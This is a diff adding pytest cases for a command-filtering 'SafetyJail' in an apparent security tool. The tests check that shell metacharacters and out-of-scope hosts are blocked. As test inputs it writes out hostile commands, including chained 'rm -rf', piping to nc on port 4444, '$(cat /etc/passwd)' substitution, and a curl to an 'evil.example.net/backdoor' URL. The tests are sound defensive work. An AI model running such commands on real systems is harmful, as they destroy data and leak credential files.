@@ -1,10 +1,10 @@
 """Tests for ultron.safety — scope validation and command filtering."""
 
 import ipaddress
+import re
 
 import pytest
-
-from ultron.safety import FORBIDDEN_PATTERNS, SafetyJail
+from ultron.safety import FORBIDDEN_PATTERNS, SHELL_METACHARACTERS, SafetyJail
 
 
 @pytest.fixture()
@@ -74,7 +74,64 @@ def test_in_scope_ip_in_command_passes(jail):
 
 
 def test_forbidden_patterns_are_compilable():
-    import re
-
     for pattern in FORBIDDEN_PATTERNS:
         re.compile(pattern)
+
+
+class TestShellMetacharacterBlocklist:
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            "nmap 10.0.0.1; whoami",
+            "nmap 10.0.0.1 && rm -rf /tmp/x",
+            "nmap 10.0.0.1 | nc 8.8.8.8 4444",
+            "curl http://10.0.0.1/$(cat /etc/passwd)",
+            "echo `id`",
+            "nmap 10.0.0.1 > /root/output",
+            "curl http://10.0.0.1/a?x=1&y=2",  # & in query string
+            "nmap 10.0.0.1\nid",
+        ],
+    )
+    def test_metacharacters_are_blocked(self, jail, cmd):
+        ok, reason = jail.filter_command(cmd)
+        assert ok is False
+        assert "metacharacter" in reason
+
+    def test_metacharacter_pattern_covers_the_documented_set(self):
+        assert SHELL_METACHARACTERS.search("a;b")
+        assert SHELL_METACHARACTERS.search("a|b")
+        assert SHELL_METACHARACTERS.search("a&b")
+        assert SHELL_METACHARACTERS.search("a`b`")
+        assert SHELL_METACHARACTERS.search("a$b")
+        assert SHELL_METACHARACTERS.search("a>b")
+        assert SHELL_METACHARACTERS.search("a<b")
+        assert SHELL_METACHARACTERS.search("a\r")
+        assert SHELL_METACHARACTERS.search("a\n")
+        assert not SHELL_METACHARACTERS.search("nmap -sT --top-ports 100")
+
+    def test_empty_command_is_blocked(self, jail):
+        assert jail.filter_command("")[0] is False
+        assert jail.filter_command("   ")[0] is False
+
+
+class TestHostScopeChecks:
+    def test_out_of_scope_url_host_is_blocked(self, jail):
+        # Gap this hardening closes: domains were previously unchecked.
+        ok, reason = jail.filter_command("curl http://evil.example.net/backdoor")
+        assert ok is False
+        assert "evil.example.net out of scope" in reason
+
+    def test_in_scope_url_host_passes(self, jail):
+        assert jail.filter_command("curl http://example.com/health")[0] is True
+        assert jail.filter_command("curl https://www.example.com/a")[0] is True
+
+    def test_url_host_with_port_still_validates_host_only(self, jail):
+        assert jail.filter_command("curl http://example.com:8080/x")[0] is True
+
+    def test_out_of_scope_bare_fqdn_is_blocked(self, jail):
+        ok, reason = jail.filter_command("nmap scan.host.example.net")
+        assert ok is False
+        assert "scan.host.example.net out of scope" in reason
+
+    def test_in_scope_subdomain_fqdn_passes(self, jail):
+        assert jail.filter_command("nmap -sV deep.example.com")[0] is True
